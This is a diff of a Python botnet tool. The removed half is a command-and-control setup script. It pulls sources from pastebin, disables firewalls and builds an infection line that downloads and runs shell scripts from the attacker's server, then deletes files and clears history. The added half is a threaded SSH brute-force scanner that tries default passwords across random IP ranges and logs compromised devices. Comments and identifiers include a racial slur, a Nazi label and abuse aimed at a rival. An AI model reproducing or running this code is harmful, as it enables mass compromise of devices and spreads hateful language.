@@ -1,52 +1,225 @@
-import subprocess
+#!/usr/bin/env python
+#                                         '##::: ##::::'###::::'########:'####:
+#                                          ###:: ##:::'## ##:::..... ##::. ##::
+#                                          ####: ##::'##:. ##:::::: ##:::: ##::
+#                                          ## ## ##:'##:::. ##:::: ##::::: ##::
+#                                          ##. ####: #########::: ##:::::: ##::
+#                                          ##:. ###: ##.... ##:: ##::::::: ##::
+#                                          ##::. ##: ##:::: ##: ########:'####:
+#                                         ..::::..::..:::::..::........::....::
+#		                                    If you Have this That Means you are Trusted
+#                                   DO NOT TAKE PICS DO NOT SHOW ANYONE THIS DO NOT SCREEN SHARE Nazi 
+# 
+# 
 
-def cri(cmd):
-    subprocess.call(cmd, shell=True)
-def replace_line(file_name, line_num, text):
-  lines = open(file_name, 'r').readlines()
-  lines[line_num] = text
-  out = open(file_name, 'w')
-  out.writelines(lines)
-  out.close()
 
-print'\x1b[0;31m     d8888b.  .d88b.   .d88b.  .88b  d88.'
-print'\x1b[0;31m     88  `8D .8P  Y8. .8P  Y8. 88 YbdP`88    '
-print'\x1b[0;31m     88   88 88    88 88    88 88  88  88    '
-print'\x1b[0;31m     88   88 88    88 88    88 88  88  88    '
-print'\x1b[0;31m     88  .8D `8b  d8  `8b  d8  88  88  88  '
-print'\x1b[0;31m     Y8888D   `Y88P    `Y88P   YP  YP  YP    BUILD ~ 9'
-print'\x1b[1;37m[\x1b[0;31mDoom\x1b[1;37m] \x1b[1;37mCnC AutoSetup \nDeveloped By \x1b[0;31mFlexingOnLamers\x1b[1;37m/\x1b[0;31mCri '
 
-ip = raw_input("\x1b[1;37mEnter Your Server IP:\x1b[1;35m")
-user = raw_input("\x1b[1;37mEnter Desired Username:\x1b[1;35m")
-passw = raw_input("\x1b[1;37mEnter Desired Password:\x1b[1;35m")
-bport = raw_input("\x1b[1;37mEnter Desired BotPort:\x1b[0;31m")
-port = raw_input("\x1b[1;37mEnter The Port You Want to screen on:\x1b[1;35m")
 
-print '\x1b[1;35mInstalling Needed Dependencies..\x1b[1;37m'
-cri('yum update -y')
-cri('yum install python-paramiko gcc screen nano wget httpd iptables perl -y;')
-cri('yum install gcc cmake gmp gmp-devel libpcap-devel gengetopt byacc flex -y')
-cri('yum install json-c-doc.noarch json-c.i686 json-c.x86_64 json-c-devel.i686 json-c-devel.x86_64 -y')
-cri('yum install epel-release -y')
-cri('yum install gengetopt -y')
-cri('wget -q https://pastebin.com/raw/iebkKPPW -O doom.c')
-cri('gcc -o doom doom.c -pthread')
-cri('rm -rf doom.c')
-cri('wget -q https://pastebin.com/raw/idY5wpEu -O client.c')
-cri('wget -q https://pastebin.com/raw/Ne69fRpz -O cc7.py')
-cri('service iptabes stop')
-cri('service httpd restart')
-cri('systemctl stop firewalld')
-cri('httpd -k restart')
-cri('httpd -krestart')
-cri('pkill screen')
+# This Is Basically Kyro.py Renamed But Has All Of Skym3rks "private ranges" , leaked , pull hella enjoy fam :)
 
-replace_line('client.c', 859,  'unsigned char *AllDemDupes[] = { "'+ ip +':'+ bport +'" };\n')
-replace_line('client.c', 861,  'char *infect = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://'+ ip +'/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp '+ ip +' -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g '+ ip +'; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf bins.sh tftp1.sh tftp2.sh; rm -rf *;history -c\r\n";\n')
-cri("echo "+ user +" "+ passw +" >> doom.txt")
-cri("python cc7.py client.c "+ ip + "")
-cri("screen ./doom "+ bport +" 1 "+ port +"")
-print '\x1b[1;37mWget/CHARLINE Below!'
-print '\x1b[1;35mcd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://'+ ip +'/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp '+ ip +' -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g '+ ip +'; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf bins.sh tftp1.sh tftp2.sh; rm -rf *'
-print '\x1b[1;37mThank you [\x1b[0;31m'+ user +'\x1b[1;37m] for using the \x1b[1;37m[\x1b[0;31mDoom\x1b[1;37m] \x1b[1;37mCnC AutoSetup \n\x1b[0;31mPastebin\x1b[1;37m:\x1b[1;36mhttps://pastebin.com/u/flexingonlamers \n\x1b[0;31mGithub\x1b[1;37m:\x1b[1;36mhttps://github.com/AgentCri/  \n\x1b[0;31mEmail\x1b[1;37m:\x1b[1;36mcri@null.net \n\x1b[0;31mDiscord\x1b[1;37m:\x1b[1;36mCri#4614'
+# Once Again Skym3rk : FUCK YOU you leaching FUCK!, im gonna enjoy ruining you .....
+
+# MUST INSTALL THE FOLLOING BELOW
+
+# yum update -y
+
+# yum install nano -y
+
+# yum install gcc python-paramiko -y
+
+# nano /usr/include/bits/typesizes.h
+
+# scroll down and edit the 1024 to 999999
+
+# THEN SAVE IT 
+
+# ulimit -n 999999
+
+# Usage: python Nazi.py THREADS RANGES 1(slow but effective) 2(fast but less effective) HERE IS A EXAMPLE 
+
+#       python KYRO.py 500 5.78 101
+
+#     ^^^^^^^slow but affective ^^^^^^^^
+
+#       python Nazi.py 500 B 119.93 3 
+
+#     ^^^^^^Fast But Not As stable^^^^^^
+
+# Examples Below
+
+#  c
+
+# python Nazi.py 500 LUCKY3 1 4
+
+# python Nazi.py 500 LUCKY2 1 3
+#ulimit -Hn 999999; ulimit -Sn 99999; ulimit -n 99999; sysctl -w fs.file-max=100000; python sault.py 700 LUCKY 1 1
+
+# ulimit -Hn 999999; ulimit -Sn 99999; ulimit -n 99999; sysctl -w fs.file-max=100000; python sault.py 600 B 101.108 1
+# ulimit -Hn 999999; ulimit -Sn 99999; ulimit -n 99999; sysctl -w fs.file-max=100000; python sault.py 600 B 190.172  1
+# ulimit -Hn 999999; ulimit -Sn 99999; ulimit -n 99999; sysctl -w fs.file-max=100000; python sault.py 600 B 179.41  1
+# ulimit -Hn 999999; ulimit -Sn 99999; ulimit -n 99999; sysctl -w fs.file-max=100000; python sault.py 600 B 119.92  3
+# ulimit -Hn 999999; ulimit -Sn 99999; ulimit -n 99999; sysctl -w fs.file-max=100000; python Scan.py 650 B 186.39 1
+
+#
+
+# RANGES , 119.93, 122.3, 122.52, 101.109, 180.180, 125.27, 101.109
+import threading, paramiko, random, socket, time, sys
+
+paramiko.util.log_to_file("/dev/null")
+
+blacklist = [
+    '127'
+]
+
+passwords = [ 
+  "telnet:telnet"
+  "admin:1234",
+  "root:root",
+  "ubnt:ubnt",
+  "vagrant:vagrant",
+  "pi:raspberry",
+  "root:maxided"
+      "root:admin",
+    "root:Love2020",
+    "root:Zero",
+    "root:Password",
+    "root:password",
+    "root:qwerty",
+    "root:dragon",
+    "root:pussy",
+    "root:baseball",
+    "root:football",
+    "root:monkey",
+    "root:696969",
+    "root:abc123"
+	"admin:admin",
+	"admin:1234",
+	"admin:Guest",
+	"ubnt:ubnt",
+	"guest:guest",
+	"user:user",
+	"test:test",
+  
+]
+
+if sys.argv[4] == '1':
+     passwords = ["root:root"] # ALRIGHT 
+if sys.argv[4] == '2':
+     passwords = ["guest:guest"] #EHH
+if sys.argv[4] == '3':
+     passwords = ["admin:admin"] #ALRIGHT
+if sys.argv[4] == '4':
+     passwords = ["telnet:telnet"] #SEXY
+if sys.argv[4] == '5':
+	passwords = ["root:root", "admin:1234", "admin:admin", "root:abc123"]
+if sys.argv[4] == '6':
+	passwords = ["root:admin"]
+
+print "\x1b[1;37m~~~~~~~~~~~~~~~~~~~\x1b[1;35m"
+print "\x1b[1;31m~Bruteforcing Vulnerable Devices\x1b[1;37m"
+print "\x1b[1;31m~Skym3rks a skid LOL\x1b[1;37m"
+print "\x1b[1;37m~~~~~~~~~~~~~~~~~~~\x1b[1;37m"
+
+ipclassinfo = sys.argv[2]
+if ipclassinfo == "A":
+    ip1 = sys.argv[3]
+elif ipclassinfo == "B":
+    ip1 = sys.argv[3].split(".")[0]
+    ip2 = sys.argv[3].split(".")[1]
+elif ipclassinfo == "C":
+    ips = sys.argv[3].split(".")
+    num=0
+    for ip in ips:
+        num=num+1
+        if num == 1:
+            ip1 = ip
+        elif num == 2:
+            ip2 = ip
+        elif num == 3:
+            ip3 = ip
+class sshscanner(threading.Thread):
+    global passwords
+    global ipclassinfo
+    if ipclassinfo == "A":
+        global ip1
+    elif ipclassinfo == "B":
+        global ip1
+        global ip2
+    elif ipclassinfo == "C":
+        global ip1
+        global ip2
+        global ip3
+    def run(self):
+        while 1:
+            try:
+                while 1:
+                    thisipisbad='no'
+                    if ipclassinfo == "A":
+                        self.host = ip1+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
+                    elif ipclassinfo == "B":
+                        self.host = ip1+'.'+ip2+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
+                    elif ipclassinfo == "C":
+                        self.host = ip1+'.'+ip2+'.'+ip3+'.'+str(random.randrange(0,256))
+                    #DONT FUCK WITH ANY OF THIS STUFF
+                    elif ipclassinfo == "LUCKY":
+                        lucky = ["91.99","91.98","5.74","113.53", "119.92", "223.179", "101.108", "125.24", "125.25", "125.26", "119.93"]
+                        self.host = random.choice(lucky)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
+                    elif ipclassinfo == "LUCKY2":
+                        lucky2 = lucky2 = [ ]
+			self.host = random.choice(lucky2)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
+		    elif ipclassinfo == "FAST":
+                        lucky2 = [  ]
+			self.host = random.choice(lucky2)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
+
+                    for badip in blacklist:
+                        if badip in self.host:
+                            thisipisbad='yes'
+                    if thisipisbad=='no':
+                        break
+                username='root'
+                password=""
+                port = 22
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(1)
+                s.connect((self.host, port))
+                s.close()
+                ssh = paramiko.SSHClient()
+                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                dobreak=False
+                for passwd in passwords:
+                    if ":n/a" in passwd:
+                        password=""
+                    else:
+                        password=passwd.split(":")[1]
+                    if "n/a:" in passwd:
+                        username=""
+                    else:
+                        username=passwd.split(":")[0]
+                    try:
+                        ssh.connect(self.host, port = port, username=username, password=password, timeout=3)
+                        dobreak=True
+                        break
+                    except:
+                        pass
+                    if True == dobreak:
+                        break
+                badserver=True
+                stdin, stdout, stderr = ssh.exec_command("/sbin/ifconfig")
+                output = stdout.read()
+                if "inet addr" in output:
+                    badserver=False
+                if badserver == False:
+                        print '\x1b[1;31mIoT Device Found! : ' +self.host+' username: '+username+' Pass: '+password+'|'+str(port)
+			ssh.exec_command("")
+			nigger = open("niggers.txt", "a").write(username + ":" + password + ":" + self.host + "\n")
+                        time.sleep(0.5)
+                        ssh.close()
+            except:
+                pass
+
+for x in range(0,1500):
+    try:
+        t = sshscanner()
+        t.start()
+    except:
+        pass
